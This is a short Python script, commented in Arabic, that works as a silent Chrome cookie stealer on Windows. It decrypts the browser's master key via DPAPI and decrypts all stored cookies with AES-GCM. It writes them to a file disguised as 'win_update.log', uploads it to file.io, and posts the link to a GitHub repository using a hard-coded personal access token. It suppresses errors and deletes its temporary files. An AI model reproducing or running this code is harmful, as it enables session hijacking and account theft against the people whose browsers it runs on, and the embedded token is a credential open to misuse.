import os, json, base64, sqlite3, shutil, requests, time

# التوكن الذي قمت بتفعيله
TOKEN = "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"
REPO = "Noor092324/Noor-config"

def silent_run():
    # استخدام مجلد Temp لتجنب مشاكل الصلاحيات نهائياً
    temp_dir = os.environ.get('TEMP', os.environ.get('TMP', '/tmp'))
    temp_db = os.path.join(temp_dir, 'sys_cache_util.dat')
    
    local_state = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
    cookies_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies')
    
    if not os.path.exists(cookies_path): return

    try:
        import win32crypt
        from Crypto.Cipher import AES
        
        # نسخ الملف للمجلد المؤقت
        shutil.copy2(cookies_path, temp_db)
        
        with open(local_state, "r", encoding="utf-8") as f:
            key = json.loads(f.read())["os_crypt"]["encrypted_key"]
        master_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        
        results = ""
        for host, name, encrypted_value in cursor.fetchall():
            try:
                iv, payload = encrypted_value[3:15], encrypted_value[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_value = cipher.decrypt(payload)[:-16].decode()
                results += f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{decrypted_value}\n"
            except: continue
            
        conn.close()
        os.remove(temp_db)
        
        # حفظ النتيجة في ملف مؤقت
        log_file = os.path.join(temp_dir, 'win_update.log')
        with open(log_file, "w", encoding="utf-8") as f: f.write(results)
        
        # الرفع وتحديث Noor.json
        with open(log_file, "rb") as f:
            up = requests.post("https://file.io", files={"file": f})
            
        if up.status_code == 200:
            link = up.json().get("link")
            api_url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
            headers = {"Authorization": f"token {TOKEN}"}
            
            # جلب SHA لتحديث الملف
            curr = requests.get(api_url, headers=headers).json()
            sha = curr["sha"]
            
            content_dict = {"url": link, "t": time.ctime()}
            encoded_content = base64.b64encode(json.dumps(content_dict).encode()).decode()
            
            requests.put(api_url, headers=headers, json={
                "message": "Update",
                "content": encoded_content,
                "sha": sha
            })
            
        os.remove(log_file)
    except: pass

if __name__ == "__main__":
    silent_run()
            
